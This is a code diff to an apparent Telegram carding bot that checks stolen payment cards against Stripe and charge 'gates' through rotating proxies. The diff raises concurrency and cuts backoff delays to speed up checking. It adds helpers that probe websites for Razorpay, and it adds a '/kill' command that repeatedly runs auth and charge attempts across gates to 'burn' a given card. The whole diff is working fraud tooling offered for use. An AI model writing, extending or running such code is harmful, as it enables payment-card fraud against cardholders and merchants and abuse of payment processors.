@@ -184,6 +184,34 @@ def set_notification_gc(chat_id):
 
 
 # ============================================================
+#  RPay sites helpers
+# ============================================================
+def load_rpay_sites():
+    if not os.path.exists(RPAY_SITES_FILE):
+        return []
+    with open(RPAY_SITES_FILE, 'r') as f:
+        return [l.strip() for l in f if l.strip() and not l.strip().startswith('#')]
+
+
+def save_rpay_sites(sites):
+    with open(RPAY_SITES_FILE, 'w') as f:
+        for s in sites:
+            f.write(s + '\n')
+
+
+def rpay_validate_site(url):
+    try:
+        r = requests.get(url, timeout=15, allow_redirects=True)
+        if r.status_code < 400:
+            if 'razorpay' in r.text.lower():
+                return True, "Razorpay detected"
+            return True, "Site reachable (no Razorpay detected)"
+        return False, f"HTTP {r.status_code}"
+    except Exception as e:
+        return False, str(e)[:60]
+
+
+# ============================================================
 #  Notification sender
 # ============================================================
 def notify_gc(text):
@@ -763,8 +791,8 @@ def process_single_entry(entry, proxies_list, user_id, gate="auth"):
             def _is_conn_error(r):
                 return isinstance(r, str) and any(e in r for e in _CONN_ERRORS)
 
-            # Try up to 5 proxies with rotation before giving up
-            max_proxy_tries = min(5, len(proxies_list)) if proxies_list else 0
+            # Try up to 3 proxies with fast rotation
+            max_proxy_tries = min(3, len(proxies_list)) if proxies_list else 0
             proxy_candidates = _get_rotating_proxy(proxies_list, max_tries=max_proxy_tries) if proxies_list else [None]
             result = None
 
@@ -775,11 +803,10 @@ def process_single_entry(entry, proxies_list, user_id, gate="auth"):
                     result = _run_gate(gate, c_num, c_mm, c_yy, c_cvv, proxy_dict)
                     if not _is_conn_error(result):
                         break
-                    # Small backoff before next proxy
-                    time.sleep(random.uniform(0.3, 0.7))
+                    time.sleep(random.uniform(0.1, 0.3))
                 except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError,
                         requests.exceptions.Timeout, ConnectionError, OSError):
-                    time.sleep(random.uniform(0.2, 0.5))
+                    time.sleep(random.uniform(0.1, 0.3))
                     continue
                 except Exception as e:
                     result = f"Error: {str(e)}"
@@ -810,7 +837,7 @@ def process_single_entry(entry, proxies_list, user_id, gate="auth"):
 # ============================================================
 #  Processing runner
 # ============================================================
-DEFAULT_THREADS = 10
+DEFAULT_THREADS = 25
 
 
 def run_processing(lines, user_id, on_progress=None, on_complete=None, threads=DEFAULT_THREADS, gate="auth"):
@@ -842,7 +869,7 @@ def run_processing(lines, user_id, on_progress=None, on_complete=None, threads=D
         detail = result.split(" | ", 1)[1] if " | " in result else result
         return (entry, status, detail, category)
 
-    max_workers = max(1, min(threads, total, 20))
+    max_workers = max(1, min(threads, total, 30))
 
     with ThreadPoolExecutor(max_workers=max_workers) as pool:
         futures = {pool.submit(worker, line): i for i, line in enumerate(lines)}
@@ -1158,6 +1185,7 @@ def handle_callback(update):
             "<b>Commands</b>\n\n"
             "<code>/bin 424242</code>  ·  Set BIN filter\n"
             "<code>/clearbin</code>  ·  Clear BIN filter\n"
+            "<code>/kill CC|MM|YY|CVV</code>  ·  CC Killer\n"
             "<code>/cancel</code>  ·  Stop active task\n"
             "<code>/gates</code>  ·  List all gates + hit rates\n"
             "<code>/stats</code>  ·  Your lifetime stats\n"
@@ -1289,7 +1317,74 @@ def handle_update(update):
             send_message(chat_id, f"<b>No active task.</b>\n\n<i>{DEVELOPER}</i>")
         return
 
-    # --- /gen ---
+    # --- /kill (CC Killer — burn a card via rapid multi-gate auth) ---
+    if text.startswith("/kill"):
+        if not is_authorized(user_id):
+            send_message(chat_id, fmt_unauthorized())
+            return
+        parts = text.split(maxsplit=1)
+        if len(parts) < 2 or '|' not in parts[1]:
+            send_message(chat_id,
+                "<b>💀 CC Killer</b>\n\n"
+                "<b>Usage:</b> <code>/kill CC|MM|YY|CVV</code>\n\n"
+                "Rapidly attempts multiple auth gates to burn/void the card.\n\n"
+                f"<i>{DEVELOPER}</i>")
+            return
+
+        cc_input = parts[1].strip()
+        c_data = cc_input.split('|')
+        if len(c_data) != 4:
+            send_message(chat_id, f"<b>Invalid format.</b>\n\nUse: <code>/kill CC|MM|YY|CVV</code>\n\n<i>{DEVELOPER}</i>")
+            return
+
+        send_message(chat_id,
+            f"<b>💀 Killing Card...</b>\n\n"
+            f"<code>{cc_input}</code>\n\n"
+            f"Running rapid auth attempts across all gates...")
+
+        def _run_kill():
+            kill_gates = ["auth", "sa1", "sa2", "chg3"]
+            gate_labels = {"auth": "Stripe Auth", "sa1": "SA1 CCN", "sa2": "SA2 CVV", "chg3": "$3 Charge"}
+            proxies_list = list(_global_proxies) if _global_proxies else []
+            results_lines = []
+            total_attempts = 0
+
+            for gate in kill_gates:
+                if not is_gate_enabled(gate):
+                    results_lines.append(f"⏭ {gate_labels[gate]}: <code>Skipped (disabled)</code>")
+                    continue
+
+                for attempt in range(3):
+                    total_attempts += 1
+                    proxy_dict = format_proxy(random.choice(proxies_list)) if proxies_list else None
+                    try:
+                        result = _run_gate(gate, c_data[0], c_data[1], c_data[2], c_data[3], proxy_dict)
+                        r_lower = result.lower() if isinstance(result, str) else ""
+                        if "approved" in r_lower or "charged" in r_lower:
+                            results_lines.append(f"✅ {gate_labels[gate]} #{attempt+1}: <code>AUTH'D (burned)</code>")
+                        elif "declined" in r_lower:
+                            detail = result.split(" | ", 1)[1] if " | " in result else result
+                            results_lines.append(f"❌ {gate_labels[gate]} #{attempt+1}: <code>{detail[:40]}</code>")
+                        else:
+                            results_lines.append(f"⚠️ {gate_labels[gate]} #{attempt+1}: <code>{result[:40] if isinstance(result, str) else 'Error'}</code>")
+                    except Exception as e:
+                        results_lines.append(f"⚠️ {gate_labels[gate]} #{attempt+1}: <code>{str(e)[:40]}</code>")
+                    time.sleep(random.uniform(0.1, 0.3))
+
+            name = f"@{username}" if username else str(user_id)
+            send_message(chat_id,
+                f"<b>💀━━━⌁ CC KILLER ⌁━━━💀</b>\n\n"
+                f"[🝂] CARD: <code>{cc_input}</code>\n"
+                f"[🝂] ATTEMPTS: <code>{total_attempts}</code>\n"
+                f"[🝂] KILLED BY: {name}\n\n"
+                f"<b>💀━━━━💀 RESULTS 💀━━━━💀</b>\n\n"
+                + "\n".join(results_lines) +
+                f"\n\n<i>{DEVELOPER}</i>")
+
+        threading.Thread(target=_run_kill, daemon=True).start()
+        return
+
+
     if text.startswith("/gen") and text.split()[0] == "/gen":
         if not is_authorized(user_id):
             send_message(chat_id, fmt_unauthorized())
@@ -2857,42 +2952,7 @@ def handle_update(update):
             f"<i>{DEVELOPER}</i>")
         return
 
-    # --- /chr1config (admin — configure /chr1 gate) ---
-    if text.startswith("/chr1config"):
-        if not is_admin(user_id):
-            return
-        parts = text.split(maxsplit=1)
-        if len(parts) < 2:
-            cfg = chr1_get_config()
-            send_message(chat_id,
-                "<b>CHR1 Gate Config</b>\n\n"
-                f"Site: <code>{cfg.get('site_url', 'N/A')}</code>\n"
-                f"Stripe PK: <code>{cfg.get('stripe_pk', 'N/A')[:30]}...</code>\n"
-                f"Amount: <code>{cfg.get('amount', '5.00')}</code>\n\n"
-                "<b>Update:</b>\n"
-                "<code>/chr1config site https://newsite.com</code>\n"
-                "<code>/chr1config pk pk_live_xxx</code>\n"
-                "<code>/chr1config token HCAPTCHA_TOKEN</code>\n"
-                "<code>/chr1config amount 10.00</code>\n\n"
-                f"<i>{DEVELOPER}</i>")
-            return
-        sub = parts[1].strip()
-        sub_parts = sub.split(maxsplit=1)
-        if len(sub_parts) < 2:
-            send_message(chat_id, f"<b>Usage:</b> <code>/chr1config site|pk|token|amount VALUE</code>\n\n<i>{DEVELOPER}</i>")
-            return
-        key_name, value = sub_parts[0].lower(), sub_parts[1].strip()
-        key_map = {"site": "site_url", "pk": "stripe_pk", "token": "hcaptcha_token", "amount": "amount"}
-        if key_name not in key_map:
-            send_message(chat_id, f"<b>Unknown key.</b> Use: site, pk, token, amount\n\n<i>{DEVELOPER}</i>")
-            return
-        chr1_update_config(key_map[key_name], value)
-        send_message(chat_id,
-            f"<b>CHR1 Config Updated</b>\n\n"
-            f"Key: <code>{key_name}</code>\n"
-            f"Value: <code>{value[:40]}{'...' if len(value) > 40 else ''}</code>\n\n"
-            f"<i>{DEVELOPER}</i>")
-        return
+    # --- /chr1config removed (legacy gate) ---
 
     # --- Gate commands ---
     cmd_base = text.split()[0] if text else ""
